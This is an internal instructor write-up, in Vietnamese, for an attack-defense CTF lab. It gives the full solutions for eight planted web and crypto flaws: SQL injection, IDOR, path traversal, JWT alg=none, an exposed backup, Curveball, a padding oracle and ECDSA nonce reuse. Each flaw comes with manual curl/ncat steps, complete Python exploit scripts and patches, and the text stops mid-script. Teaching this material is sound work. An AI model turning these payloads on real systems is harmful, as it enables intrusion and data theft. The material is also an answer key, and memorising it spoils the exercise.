# Writeup 8 lỗ hổng — kể theo góc nhìn người chơi (có script + khai thác thủ công từng bước)

> ⚠️ **Tài liệu nội bộ (tác giả/giảng viên lab).** Có lời giải đầy đủ. Không phát cho thí sinh.
> Chỉ dùng trên VM trong phạm vi lab cô lập `pool141`.

Tôi vào một trận Attack–Defense 3 đội. Mỗi đội chạy một bản sao hệ thống; mỗi tick hệ thống chấm tự cắm flag mới qua chức năng bình thường nên lúc nào cũng có flag còn hiệu lực. Việc của tôi: **cướp flag đội khác** và **vá máy mình** mà checker vẫn UP.

Mục tiêu ví dụ — team2 (đổi IP cho đội khác):

| Vòng | Dịch vụ | Địa chỉ | Lỗ |
|---|---|---|---|
| 1 Web | Meko Boutique | `http://10.90.0.12/` (port 80) | SQLi, IDOR, Upload, JWT, Backup |
| 2 Crypto | 3 service TCP line-JSON | `10.90.0.12:9011 / :9012 / :9013` | Curveball, Padding Oracle, ECDSA nonce |

- **Flag Web:** `MekoDataCTF{` + 30 ký tự **in hoa/chữ số** `[A-Z0-9]` + `}`.
- **Flag Crypto:** `MekoDataCTF{` + **32 hex** `[a-f0-9]` + `}`.
- Mã nguồn đối chiếu: Web [`labs/full_rounds/app/app.py`](../labs/full_rounds/app/app.py); Crypto [`labs/full_rounds/round2/crypto_ad/service.py`](../labs/full_rounds/round2/crypto_ad/service.py) + [`protocol.py`](../labs/full_rounds/round2/crypto_ad/protocol.py).
- Script sẵn có (chỉ thư viện chuẩn Python 3): Web [`labs/meko_boutique/writeups/exploits/`](../labs/meko_boutique/writeups/exploits/) · Crypto [`labs/full_rounds/round2/writeups/exploits/`](../labs/full_rounds/round2/writeups/exploits/).

**Chạy từ đâu:** script **phải chạy trên một máy trong sandbox tới được đội mục tiêu** — VM một đội (Kali) hoặc VM checker. Máy Windows BTC **không** trực tiếp với tới `10.90.0.x`. Mở gateway (`meko gateway start`) thì có thể tấn công Web qua cổng `20001..` trên máy BTC, nhưng ví dụ dưới đây tôi đứng trên VM đội.

Mỗi lỗ gồm: **(A) khai thác thủ công từng bước** rồi **(B) script tự động** (nhúng nguyên văn).

---

## VÒNG 1 — WEB (Meko Boutique)

### Chuẩn bị chung: mở đầu bằng recon

```bash
TARGET=http://10.90.0.12

# 1. Service sống không, đúng đội không
curl -s $TARGET/health
# -> {"status":"ok","service":"meko-boutique","team":"team2"}

# 2. robots.txt là quà: hé lộ /staff và /exports/
curl -s $TARGET/robots.txt
# User-agent: *
# Disallow: /staff
# Disallow: /exports/
```

Nhiều lỗ cần một phiên đăng nhập. Tạo sẵn một tài khoản tấn công, lưu cookie vào `jar.txt`:

```bash
U=atk-$RANDOM ; P=$(head -c16 /dev/urandom | base64 | tr -dc 'A-Za-z0-9')xZ9

# Đăng ký (mật khẩu phải ≥ 10 ký tự). -c lưu cookie, -i để thấy 302.
curl -s -i -c jar.txt "$TARGET/register" \
  --data-urlencode "username=$U" --data-urlencode "password=$P" \
  --data-urlencode "name=$U" --data-urlencode "email=$U@example.test" | head -1
# HTTP/1.1 302 FOUND

# Đăng nhập: -b đọc + -c ghi cookie (nhận cả session Flask và cookie meko_member JWT)
curl -s -i -b jar.txt -c jar.txt "$TARGET/login" \
  --data-urlencode "username=$U" --data-urlencode "password=$P" | head -1
# HTTP/1.1 302 FOUND
```

Từ đây dùng `-b jar.txt` cho các request cần đăng nhập.

---

### Lỗ 1 — SQL Injection (UNION) · Tìm bộ sưu tập
**Flag ở:** `collection_notes.note`. **Không cần đăng nhập.**

#### Tôi nghi ngờ thế nào
```bash
curl -s "$TARGET/collections/search?q=linen"   # ra vài thẻ bộ sưu tập
curl -s -o /dev/null -w "%{http_code}\n" "$TARGET/collections/search?q=%27"   # q=' -> 500
```
Một dấu nháy làm trang **500** ⇒ input chui thẳng vào SQL.

#### Mã lỗi — [`app.py:224`](../labs/full_rounds/app/app.py#L224)
```python
sql = "SELECT id,title,description FROM collections WHERE title LIKE '%" + q + "%'"
rows = db.execute(sql).fetchall()
```
SELECT trả 3 cột, `title` được in trong `<h2>`. Dùng **UNION 3 cột** kéo `note` của bảng `collection_notes` sang cột `title`.

#### (A) Khai thác thủ công — từng bước
```bash
# Payload: zzz%' đóng chuỗi LIKE; UNION 3 cột (note vào vị trí title); -- - bỏ phần đuôi.
curl -s "$TARGET/collections/search" \
  --data-urlencode "q=zzz%' UNION SELECT id, note, user_id FROM collection_notes-- -" \
  -G | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```
`-G` để curl đưa `--data-urlencode` vào query string của GET. Mỗi tick nhiều note ⇒ nhiều flag. Muốn xem bảng catalog có gì: thay bằng `UNION SELECT name,sql,1 FROM sqlite_master-- -`.

#### (B) Script — [`exploits/sqli.py`](../labs/meko_boutique/writeups/exploits/sqli.py)
```python
#!/usr/bin/env python3
"""Khai thác SQL Injection (UNION) — /collections/search."""
import html, re, sys
from urllib.parse import urlencode
from common import Session, find_flags

PAYLOAD = "zzz%' UNION SELECT id, note, user_id FROM collection_notes-- -"

def exploit(base, timeout=8):
    s = Session(base, timeout)
    st, _, body = s.req("/collections/search?" + urlencode({"q": PAYLOAD}))
    if st != 200:
        print(f"[!] HTTP {st} — có thể đã vá (sqli=true) hoặc service lỗi", file=sys.stderr)
    titles = [html.unescape(t) for t in re.findall(r"<h2>([^<]+)</h2>", body)]
    return find_flags("\n".join(titles))

if __name__ == "__main__":
    for base in sys.argv[1:] or ["http://127.0.0.1:8080"]:
        flags = exploit(base)
        print(f"[{base}] SQLi: {len(flags)} flag")
        for f in flags: print("  " + f)
```
```bash
python3 sqli.py http://10.90.0.12
```

#### Vá
Tham số hóa (nhánh `patched` có sẵn): `... WHERE title LIKE ?`, `("%"+q+"%",)`. Đừng chặn cứng ký tự `'` (checker tìm theo tên bộ sưu tập, dễ MUMBLE).

---

### Lỗ 2 — IDOR · Hóa đơn đơn hàng
**Flag ở:** `orders.memo`. **Cần đăng nhập (tài khoản bất kỳ).**

#### Tôi nghi ngờ thế nào
Mua một món rồi xem hóa đơn, URL là `/account/orders/<số>/invoice`. Đổi số sang đơn mẫu có sẵn:
```bash
curl -s -b jar.txt "$TARGET/account/orders/9001/invoice" | grep -i "An Nhiên"
```
Xem được hóa đơn của khách khác ⇒ IDOR.

#### Mã lỗi — [`app.py:395`](../labs/full_rounds/app/app.py#L395)
```python
order = db.execute("SELECT * FROM orders WHERE id=?", (order_id,)).fetchone()
if not order: abort(404)
if patched("idor") and order["user_id"] != session["uid"]:   # chỉ kiểm khi đã vá
    abort(403)
```
Checker cắm flag vào `memo` của một đơn mới mỗi tick; `id` đơn tự tăng (bản mẫu là 9001).

#### (A) Khai thác thủ công — từng bước
```bash
# Quét một dải id quanh đơn mới nhất; đơn do checker tạo nằm từ ~9002 trở lên.
for id in $(seq 9001 9300); do
  curl -s -b jar.txt "$TARGET/account/orders/$id/invoice" \
    | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}' | sed "s/^/order $id: /"
done
```

#### (B) Script — [`exploits/idor.py`](../labs/meko_boutique/writeups/exploits/idor.py)
```python
#!/usr/bin/env python3
"""Khai thác IDOR — hóa đơn đơn hàng. /account/orders/<id>/invoice không kiểm chủ."""
import sys
from common import register_login, find_flags

def exploit(base, start=9001, span=1200, low_span=400, timeout=8):
    s, _, _ = register_login(base, timeout)
    flags = set()
    ids = list(range(start, start + span)) + list(range(1, low_span))
    for oid in ids:
        st, _, body = s.req(f"/account/orders/{oid}/invoice")
        if st == 200:
            flags.update(find_flags(body))
    return sorted(flags)

if __name__ == "__main__":
    args = sys.argv[1:]
    base = args[0] if args else "http://127.0.0.1:8080"
    start = int(args[1]) if len(args) > 1 else 9001
    span = int(args[2]) if len(args) > 2 else 1200
    flags = exploit(base, start, span)
    print(f"[{base}] IDOR: {len(flags)} flag")
    for f in flags: print("  " + f)
```
```bash
python3 idor.py http://10.90.0.12          # hoặc: python3 idor.py http://10.90.0.12 9001 1500
```

#### Vá
Bật kiểm chủ sở hữu: `if order["user_id"] != session["uid"]: abort(403)`. Checker chỉ xem đơn của chính nó nên UP.

---

### Lỗ 3 — Path Traversal · Studio phối đồ (upload manifest)
**Flag ở:** `simulation/private/<token>.json` (trường `stylist_note`). **Cần đăng nhập.**

#### Tôi nghi ngờ thế nào
`/outfits/new` nhận tệp **manifest JSON**; trường `preview_file` trỏ tới tệp xem trước, server **in nội dung** vào `<pre>`. `preview_file` có `../` thì nội dung đổi ⇒ đọc tệp tùy ý.

#### Mã lỗi — [`app.py:412`](../labs/full_rounds/app/app.py#L412)
```python
base = (data/"simulation"/"designs").resolve()
sandbox_root = (data/"simulation").resolve()
target = (base / manifest.get("preview_file","")).resolve()
if patched("upload") and not target.is_relative_to(base):   # chỉ chặn khi đã vá
    abort(400)
if not target.is_relative_to(sandbox_root) or not target.is_file():  # rào CỨNG
    abort(400)
...
return page("Bản phối đã lưu", preview_text=target.read_text(...), ...)
```

#### ⚠️ Giới hạn thật (phải trung thực)
1. **Rào cứng:** mọi đường dẫn buộc dưới `.../simulation`. `../../../../etc/passwd` **luôn 400** kể cả chưa vá — chỉ là LFI trong vùng giả lập, không chạm host.
2. **Cần token nạn nhân:** flag ở `private/<token>.json`, `token = token_hex(16)` ngẫu nhiên, app không liệt kê thư mục/không lộ token người khác ⇒ chỉ primitive này **không dò được token nạn nhân**. Lỗ Upload chủ yếu ăn **điểm phòng thủ/SLA** và chứng minh primitive.

#### (A) Khai thác thủ công — từng bước
```bash
# (1) Chứng minh đọc được tệp: đọc preview công khai designs/lookbook.txt
printf '{"name":"x","preview_file":"lookbook.txt"}' > m.json
curl -s -b jar.txt -F "manifest=@m.json;type=application/json" \
  "$TARGET/outfits/new" | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p'
# -> dòng gợi ý phối đồ "...linen..."

# (2) Self-PoC: tự cắm stylist_note, lấy token CỦA MÌNH, đọc lại qua traversal
printf '{"name":"d","preview_file":"lookbook.txt","stylist_note":"NOTE-CUA-TOI"}' > m.json
TOK=$(curl -s -b jar.txt -F "manifest=@m.json;type=application/json" \
  "$TARGET/outfits/new" | grep -oE '/outfits/[0-9a-f]{32}' | head -1 | cut -d/ -f3)
printf '{"name":"x","preview_file":"../private/%s.json"}' "$TOK" > m.json
curl -s -b jar.txt -F "manifest=@m.json;type=application/json" \
  "$TARGET/outfits/new" | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p'
# -> JSON có "stylist_note":"NOTE-CUA-TOI"  => traversal vào private hoạt động

# (3) Nếu rò rỉ được token nạn nhân <VT>: đọc flag
printf '{"name":"x","preview_file":"../private/<VT>.json"}' > m.json
curl -s -b jar.txt -F "manifest=@m.json;type=application/json" \
  "$TARGET/outfits/new" | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```

#### (B) Script — [`exploits/upload.py`](../labs/meko_boutique/writeups/exploits/upload.py)
```python
#!/usr/bin/env python3
"""Khai thác Upload — path traversal trong preview_file (/outfits/new)."""
import json, re, sys
from common import find_flags, register_login

def read_via_preview(s, relpath):
    manifest = {"name": "x", "preview_file": relpath}
    st, _, body = s.req("/outfits/new", upload=("manifest","o.json",json.dumps(manifest).encode()))
    found = re.search(r"<pre>(.*?)</pre>", body, re.S)
    return st, (found.group(1) if found else "")

def plant_own_note(s, note):
    manifest = {"name":"demo","preview_file":"lookbook.txt","stylist_note":note}
    st, _, body = s.req("/outfits/new", upload=("manifest","o.json",json.dumps(manifest).encode()))
    found = re.search(r'/outfits/([0-9a-f]{32})', body)
    return found.group(1) if found else None

def exploit(base, victim_token=None, timeout=8):
    s, _, _ = register_login(base, timeout)
    flags = set()
    st, pre = read_via_preview(s, "lookbook.txt")
    print(f"    [primitive] đọc designs/lookbook.txt -> HTTP {st}, {len(pre)} ký tự")
    token = plant_own_note(s, "ghi-chu-rieng-cua-toi")
    if token:
        st, pre = read_via_preview(s, f"../private/{token}.json")
        print(f"    [self-PoC] traversal ../private/{token}.json -> HTTP {st}, "
              f"đọc được ghi chú riêng: {'ghi-chu-rieng-cua-toi' in pre}")
    if victim_token:
        st, pre = read_via_preview(s, f"../private/{victim_token}.json")
        flags.update(find_flags(pre))
    return sorted(flags)

if __name__ == "__main__":
    args = sys.argv[1:]
    base = args[0] if args else "http://127.0.0.1:8080"
    victim_token = args[1] if len(args) > 1 else None
    print(f"[{base}] Upload:")
    for f in exploit(base, victim_token): print("  FLAG " + f)
```
```bash
python3 upload.py http://10.90.0.12                     # chứng minh primitive + self-PoC
python3 upload.py http://10.90.0.12 <token_nan_nhan>    # nếu có token
```

#### Vá
Bật ép đường dẫn trong `designs/`: `if not target.is_relative_to(base): abort(400)`. Preview hợp lệ vẫn trong `designs/` nên checker UP.

---

### Lỗ 4 — JWT `alg=none` · Ưu đãi hội viên
**Flag ở:** `vip_offers.code`. **Cần đăng nhập.**

#### Tôi nghi ngờ thế nào
Sau login có cookie `meko_member` 3 phần. Giải base64 phần giữa:
```bash
BODY=$(grep meko_member jar.txt | awk '{print $7}' | cut -d. -f2)
echo "${BODY}===" | tr '_-' '/+' | base64 -d 2>/dev/null; echo
# -> {"sub":"7","rank":"basic","exp":...}
```
Khu `/member/benefits` chặn theo `rank` ⇒ thử đổi rank và ký lại bằng `alg=none`.

#### Mã lỗi — [`app.py:471`](../labs/full_rounds/app/app.py#L471) `is_vip`
```python
valid = ((header.get("alg")=="none" and sig=="" and not patched("jwt"))
         or (header.get("alg")=="HS256" and hmac.compare_digest(expected, sig)))
if valid and claims.get("exp",0) > time.time() and claims.get("sub")==str(session["uid"]):
    member = claims
return member.get("rank") in (VIP_RANK, VIP_RANK+"-plus")   # VIP_RANK = "c-nocturne"
```
Chưa vá: token `alg=none`, chữ ký **rỗng** được chấp nhận. Chỉ cần `sub` = uid phiên của tôi và `exp` còn hạn.

#### (A) Khai thác thủ công — từng bước
```bash
SUB=7   # đọc từ bước trên

# Rèn token alg=none, chữ ký rỗng (base64url, bỏ '=')
b64() { python3 -c "import base64,sys;print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"; }
HEAD=$(b64 '{"alg":"none","typ":"JWT"}')
BODY=$(b64 "{\"sub\":\"$SUB\",\"rank\":\"c-nocturne\",\"exp\":$(( $(date +%s)+3600 ))}")
FORGED="$HEAD.$BODY."

# Gửi kèm: cookie session Flask (từ jar.txt) + cookie meko_member GIẢ
SID=$(grep mekodata.sid jar.txt 2>/dev/null | awk '{print $7}')
curl -s -b "session=$SID; meko_member=$FORGED" "$TARGET/member/benefits" \
  | grep -oE '/member/offers/[0-9]+' | sort -u
# Mở từng offer lấy flag trong 'code'
for id in $(curl -s -b "session=$SID; meko_member=$FORGED" "$TARGET/member/benefits" \
            | grep -oE '/member/offers/[0-9]+' | grep -oE '[0-9]+$' | sort -u); do
  curl -s -b "session=$SID; meko_member=$FORGED" "$TARGET/member/offers/$id" \
    | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
done
```
> Cookie session của Flask tên thật là `session` (bên ForcAD là khác — ở app này là `session`). Cách gọn nhất là để script quản lý cookie (bên dưới), vì nó ghi đè đúng `meko_member` trong jar và giữ nguyên session.

#### (B) Script — [`exploits/jwt.py`](../labs/meko_boutique/writeups/exploits/jwt.py)
```python
#!/usr/bin/env python3
"""Khai thác JWT alg=none — khu ưu đãi hội viên C-Nocturne."""
import json, re, sys, time
from common import b64url, find_flags, register_login, uid_from_cookie

def forge_none(sub):
    head = b64url(b'{"alg":"none","typ":"JWT"}')
    body = b64url(json.dumps({"sub": str(sub), "rank": "c-nocturne",
                              "exp": int(time.time()) + 3600}).encode())
    return head + "." + body + "."          # chữ ký rỗng

def exploit(base, timeout=8):
    s, _, _ = register_login(base, timeout)
    sub = uid_from_cookie(s)
    if sub is None:
        raise SystemExit("[!] Không đọc được sub từ cookie meko_member")
    s.set_cookie_value("meko_member", forge_none(sub))   # giữ session, chỉ thay meko_member
    st, _, body = s.req("/member/benefits")
    if st != 200:
        print(f"[!] /member/benefits HTTP {st} — có thể đã vá (jwt=true)", file=sys.stderr)
        return []
    flags = set(find_flags(body))
    for oid in sorted(set(re.findall(r"/member/offers/(\d+)", body)), key=int):
        st, _, page = s.req(f"/member/offers/{oid}")
        if st == 200: flags.update(find_flags(page))
    return sorted(flags)

if __name__ == "__main__":
    for base in sys.argv[1:] or ["http://127.0.0.1:8080"]:
        flags = exploit(base)
        print(f"[{base}] JWT: {len(flags)} flag")
        for f in flags: print("  " + f)
```
```bash
python3 jwt.py http://10.90.0.12
```

#### Vá
Bỏ nhánh `alg=none` (bật `patched("jwt")`): chỉ chấp nhận HS256 chữ ký đúng. Checker dùng token HS256 thật nên UP.

---

### Lỗ 5 — Lộ bản backup · Bản xuất vận hành
**Flag ở:** `reconciliation_notes.value`. **Không cần đăng nhập.**

#### Tôi nghi ngờ thế nào
`robots.txt` cấm `/exports/`. Thử thẳng:
```bash
curl -s "$TARGET/exports/operations.sql" | head
# -- Meko Boutique — ban xuat doi soat van hanh ...
# INSERT INTO reconciliation_notes(ref,value) VALUES ('RC-...','MekoDataCTF{...}');
```

#### Mã lỗi — [`app.py:516`](../labs/full_rounds/app/app.py#L516)
```python
if patched("backup") and session.get("staff") is not True:  # chỉ chặn khi đã vá
    abort(404)
rows = db.execute("SELECT ref,value FROM reconciliation_notes ORDER BY id DESC LIMIT 100")
```

#### (A) Khai thác thủ công
```bash
curl -s "$TARGET/exports/operations.sql" | grep -oE 'MekoDataCTF\{[A-Z0-9]{30}\}'
```
Một request, ra mọi flag còn trong 100 dòng mới nhất.

#### (B) Script — [`exploits/backup.py`](../labs/meko_boutique/writeups/exploits/backup.py)
```python
#!/usr/bin/env python3
"""Khai thác Backup — bản xuất dữ liệu vận hành bị công khai (/exports/operations.sql)."""
import sys
from common import Session, find_flags

def exploit(base, timeout=8):
    s = Session(base, timeout)
    st, _, body = s.req("/exports/operations.sql")
    if st != 200:
        print(f"[!] HTTP {st} — có thể đã vá (backup=true, khách nhận 404)", file=sys.stderr)
        return []
    return find_flags(body)

if __name__ == "__main__":
    for base in sys.argv[1:] or ["http://127.0.0.1:8080"]:
        flags = exploit(base)
        print(f"[{base}] Backup: {len(flags)} flag")
        for f in flags: print("  " + f)
```
```bash
python3 backup.py http://10.90.0.12
```

#### Vá
Bật `patched("backup")`: chỉ cho tải khi `session["staff"]`. **Không** xóa route (checker đăng nhập staff rồi gọi `/exports/operations.sql`; xóa sẽ MUMBLE).

> **Chạy cả 5 lỗ Web một lượt:** `cd labs/meko_boutique/writeups/exploits && python3 exploit_all.py http://10.90.0.12`

Thư viện chung [`exploits/common.py`](../labs/meko_boutique/writeups/exploits/common.py) lo phần phiên HTTP có cookie, `register_login()`, `uid_from_cookie()`, `set_cookie_value()`, `b64url()`, `find_flags()` (regex `MekoDataCTF\{[A-Z0-9]{30}\}`). Mọi script `from common import ...`.

---

## VÒNG 2 — CRYPTO (3 service TCP line-JSON)

Giao thức: gửi **một dòng JSON**, nhận **một dòng JSON**. Recon bằng `ncat` (có trên Kali):

```bash
printf '{"op":"info"}\n'    | ncat 10.90.0.12 9011    # {"service":"curveball","patched":false,...}
printf '{"op":"targets"}\n' | ncat 10.90.0.12 9011    # {"targets":[{"record":"...","tick":N},...]}
```

`op:"targets"` cho danh sách `record` còn flag. `op:"get"`/`"put"` cần admin token (không có) ⇒ phải **khai thác đúng lỗ** để đọc flag theo `record`. Tham số đường cong P-256 lấy từ [`protocol.py`](../labs/full_rounds/round2/crypto_ad/protocol.py) (G, N, `sign`, `verify`, `pack_point`, `unpack_point`, `certificate_message`, `Client`).

**Vị trí chạy:** trên VM trong pool (VM đội hoặc checker). Script dùng `common.py` của thư mục writeup, tự tìm `protocol.py` ở cạnh script / trong repo / `/opt/meko-crypto`.

Thư viện chung [`exploits/common.py`](../labs/full_rounds/round2/writeups/exploits/common.py) cung cấp `Client`, `targets_of(client)` (liệt kê record), `show(service,host,results)` và nạp lại `protocol.py`.

---

### Lỗ 6 — Curveball (9011) · generator do client chọn
Mô phỏng CVE-2020-0601. Service xác minh chữ ký chứng chỉ bằng **điểm sinh (generator) do client gửi**, không ép phải là `G` chuẩn.

#### Mã lỗi — [`service.py:107`](../labs/full_rounds/round2/crypto_ad/service.py#L107) op `read`
```python
generator = unpack_point(req['G'])
if self.patched and generator != G:            # chỉ ép khi đã vá
    return {'ok': False, 'error': 'untrusted_generator'}
if not verify(certificate_message(record, role), req['signature'], self.public, generator):
    return {'ok': False, 'error': 'bad_certificate'}
if role != 'admin': return {...'forbidden'}
return {'ok': True, 'flag': self.flag(record)}
```
**Mẹo:** khai báo generator **bằng chính khóa công khai Q** của service. Khi đó `Q = 1·Q`, tức ứng với khóa riêng **d = 1** so với generator `Gp = Q`. Biết “d = 1”, tự ký chứng chỉ `role=admin` không cần khóa thật.

#### (A) Khai thác thủ công — toán + lệnh
Lấy `Q` từ `op:"ca"`, chọn `k = 1`:
```
r = (Gp·k).x mod N = Q.x mod N
s = k⁻¹·(h + r·d) mod N = h + r     (d=1, k=1; h = SHA256(certificate_message(record,"admin")))
```
Chạy từng bước trong Python REPL trên VM (có thư viện `ecdsa`):
```python
from protocol import Client, N, G, digest, pack_point, unpack_point, certificate_message
c = Client("10.90.0.12", 9011)
Q = unpack_point(c.call(op="ca")["Q"])                    # khóa công khai service
rec = c.call(op="targets")["targets"][0]["record"]        # một record còn flag
msg = certificate_message(rec, "admin")
h = int.from_bytes(digest(msg), "big")
r = Q.x() % N ; s = (h + r) % N
sig = {"r": format(r,"064x"), "s": format(s,"064x")}
print(c.call(op="read", G=pack_point(Q), role="admin", record=rec, signature=sig))
# -> {'ok': True, 'flag': 'MekoDataCTF{...}'}
```

#### (B) Script — [`exploits/exploit_curveball.py`](../labs/full_rounds/round2/writeups/exploits/exploit_curveball.py)
```python
#!/usr/bin/env python3
"""Curveball (9011): giả mạo chứng chỉ admin bằng generator do client chọn."""
import sys
from common import Client, N, digest, pack_point, unpack_point, certificate_message, targets_of, show

def run(host, port=9011):
    out = []
    with Client(host, port) as c:
        Q = unpack_point(c.call(op='ca')['Q'])            # khóa công khai service
        for record in targets_of(c):
            message = certificate_message(record, 'admin')
            h = int.from_bytes(digest(message), 'big')
            k = 1                                          # generator = Q, private d = 1
            r = (Q * k).x() % N
            s = (pow(k, -1, N) * (h + r * 1)) % N          # s = h + r
            signature = {'r': format(r, '064x'), 's': format(s, '064x')}
            resp = c.call(op='read', G=pack_point(Q), role='admin', record=record, signature=signature)
            out.append((record, resp.get('flag') or resp.get('error') or str(resp)))
    return out

if __name__ == '__main__':
    if len(sys.argv) < 2: sys.exit('Dùng: python3 exploit_curveball.py <ip_doi> [port]')
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9011
    show('curveball', sys.argv[1], run(sys.argv[1], port))
```
```bash
python3 exploit_curveball.py 10.90.0.12
```

#### Vá
Bật `patched`: từ chối mọi generator ≠ G chuẩn (`untrusted_generator`). Checker ký/đọc bằng G thật nên UP.

---

### Lỗ 7 — Padding Oracle (9012) · AES-CBC lộ lỗi đệm
Service giải mã AES-CBC, **trả lỗi khác nhau** cho “đệm PKCS7 sai” vs “đệm đúng, nội dung sai”, và **không kiểm MAC**. Đó là **oracle nhị phân** để giải mã bản mã của flag mà không cần khóa AES.

#### Mã lỗi — [`service.py:128`](../labs/full_rounds/round2/crypto_ad/service.py#L128) op `decrypt`
```python
if self.patched:   # bản vá: bắt buộc MAC hợp lệ trước khi giải mã
    expected = hmac(...);  if tag sai: return {'error':'invalid_request'}
plain = unpad(AES_CBC(key, iv=raw[:16]).decrypt(raw[16:]), 16)
except ...: return {'error': 'invalid_request' if patched else 'padding'}   # lộ 'padding'
if not plain.startswith(b'public:'):
    return {'error': 'invalid_request' if patched else 'content'}           # khác: 'content'
```
Chưa vá: đệm sai → `"padding"`; đệm đúng mà nội dung sai → `"content"`/`ok`. Hai nhãn khác nhau = oracle. Bản mã flag lấy qua `op:"ciphertext"`.

#### (A) Khai thác thủ công — probe + cơ chế
Thấy oracle phân biệt được bằng tay:
```bash
# Bản mã flag (IV ‖ C), hex:
printf '{"op":"ciphertext","record":"<REC>"}\n' | ncat 10.90.0.12 9012
# Gửi một ciphertext rác -> 'padding' (đệm sai); sửa 1 byte tới khi khác 'padding'
printf '{"op":"decrypt","record":"<REC>","ciphertext":"00..00"}\n' | ncat 10.90.0.12 9012
# -> {"ok":false,"error":"padding"}   (nhãn này chính là oracle)
```
Thuật toán (chuẩn CBC padding oracle, giải từng khối phải→trái). Với khối mã `C` và khối trước `P`:
- Rèn khối giả `F`; với từng vị trí, đoán byte `g` sao cho `unpad` hợp lệ ⇒ **byte trung gian** `I = g ⊕ pad`.
- Bản rõ: `plain = I ⊕ P`.
- Loại dương-tính-giả `0x02..` khi `pad=1`: đổi byte áp chót rồi thử lại.

16 byte × số khối. Làm tay 1 byte để hiểu, còn lại để script lặp:
```python
from protocol import Client
c = Client("10.90.0.12", 9012)
def oracle(rec, raw):
    r = c.call(op="decrypt", record=rec, ciphertext=raw.hex())
    return r.get("ok") or r.get("error") != "padding"   # True nếu đệm hợp lệ
# forged[-1] = g; khi oracle True lần đầu => I[-1] = g ^ 0x01
```

#### (B) Script — [`exploits/exploit_padding_oracle.py`](../labs/full_rounds/round2/writeups/exploits/exploit_padding_oracle.py)
```python
#!/usr/bin/env python3
"""Padding Oracle (9012): giải mã AES-CBC bằng oracle lỗi phân biệt được."""
import sys
from common import Client, targets_of, show
BLOCK = 16

def oracle(client, record, raw):
    resp = client.call(op='decrypt', record=record, ciphertext=raw.hex())
    return bool(resp.get('ok')) or resp.get('error') != 'padding'

def recover_block(client, record, prev, block):
    inter = bytearray(BLOCK)
    for pad in range(1, BLOCK + 1):
        forged = bytearray(BLOCK)
        for i in range(1, pad):
            forged[-i] = inter[-i] ^ pad
        for guess in range(256):
            forged[-pad] = guess
            if oracle(client, record, bytes(forged) + block):
                if pad == 1:                               # loại đệm 0x02.. giả
                    forged[-2] ^= 1
                    if not oracle(client, record, bytes(forged) + block): continue
                inter[-pad] = guess ^ pad
                break
    return bytes(a ^ b for a, b in zip(inter, prev))

def decrypt(client, record, raw):
    blocks = [raw[i:i + BLOCK] for i in range(0, len(raw), BLOCK)]
    out = b''.join(recover_block(client, record, blocks[i], blocks[i + 1])
                   for i in range(len(blocks) - 1))
    return out[:-out[-1]] if out else out

def run(host, port=9012):
    out = []
    with Client(host, port) as c:
        for record in targets_of(c):
            raw = bytes.fromhex(c.call(op='ciphertext', record=record)['ciphertext'])
            try:
                out.append((record, decrypt(c, record, raw).decode('utf-8', 'replace')))
            except (ValueError, KeyError) as exc:
                out.append((record, f'loi: {exc}'))
    return out

if __name__ == '__main__':
    if len(sys.argv) < 2: sys.exit('Dùng: python3 exploit_padding_oracle.py <ip_doi> [port]')
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9012
    show('padding_oracle', sys.argv[1], run(sys.argv[1], port))
```
```bash
python3 exploit_padding_oracle.py 10.90.0.12
```

#### Vá
Bật `patched`: **encrypt-then-MAC** — bắt buộc `tag` HMAC hợp lệ trước khi giải mã; mọi lỗi trả cùng nhãn `invalid_request`. Hết oracle. Checker gửi kèm `tag` đúng nên UP.

---

### Lỗ 8 — ECDSA nonce reuse (9013) · dùng lại nonce
op `sign` ký ECDSA với **cùng một nonce `k` cố định** cho mọi chữ ký ⇒ lộ khóa riêng.

#### Mã lỗi — [`service.py:146`](../labs/full_rounds/round2/crypto_ad/service.py#L146)
```python
if op == 'sign':
    if message.startswith('unlock:'): return {'error':'forbidden_message'}   # chặn tự mở khóa
    return {'signature': sign(message, self.private, nonce=None if self.patched else self.nonce)}
if op == 'unlock':
    if verify('unlock:'+req['record'], req['signature'], self.public):
        return {'flag': self.flag(req['record'])}
```
Chưa vá: `nonce=self.nonce` cố định. Service chặn ký trực tiếp `unlock:...`, nhưng có **khóa riêng** thì tự ký ở nhà.

#### (A) Khai thác thủ công — toán + lệnh
Xin 2 chữ ký khác message, chúng **cùng `r`** (vì cùng `k`):
```
k = (h1 - h2) / (s1 - s2)  mod N
d = (s1·k - h1) / r        mod N      (khóa riêng)
```
```python
from protocol import Client, N, digest, sign
c = Client("10.90.0.12", 9013)
a = c.call(op="sign", message="meko-a")["signature"]
b = c.call(op="sign", message="meko-b")["signature"]
r, s1, s2 = int(a["r"],16), int(a["s"],16), int(b["s"],16)
h1 = int.from_bytes(digest("meko-a"),"big"); h2 = int.from_bytes(digest("meko-b"),"big")
k = ((h1-h2) * pow(s1-s2,-1,N)) % N
d = ((s1*k - h1) * pow(r,-1,N)) % N          # khóa riêng
rec = c.call(op="targets")["targets"][0]["record"]
print(c.call(op="unlock", record=rec, signature=sign("unlock:"+rec, d)))
# -> {'ok': True, 'flag': 'MekoDataCTF{...}'}
```
(Nếu `s1 == s2`: dịch vụ có thể đã vá — nonce ngẫu nhiên — không giải được.)

#### (B) Script — [`exploits/exploit_ecdsa.py`](../labs/full_rounds/round2/writeups/exploits/exploit_ecdsa.py)
```python
#!/usr/bin/env python3
"""ECDSA Nonce (9013): khôi phục khóa riêng do nonce bị dùng lại."""
import sys
from common import Client, G, N, digest, sign, targets_of, show

def recover_private(host, port):
    with Client(host, port) as c:
        a = c.call(op='sign', message='meko-a')['signature']
        b = c.call(op='sign', message='meko-b')['signature']
    r, s1, s2 = int(a['r'], 16), int(a['s'], 16), int(b['s'], 16)
    h1 = int.from_bytes(digest('meko-a'), 'big')
    h2 = int.from_bytes(digest('meko-b'), 'big')
    if s1 == s2:
        raise ValueError('hai chữ ký giống nhau: dịch vụ có thể đã vá (nonce ngẫu nhiên)')
    k = ((h1 - h2) * pow(s1 - s2, -1, N)) % N
    d = ((s1 * k - h1) * pow(r, -1, N)) % N
    return d

def run(host, port=9013):
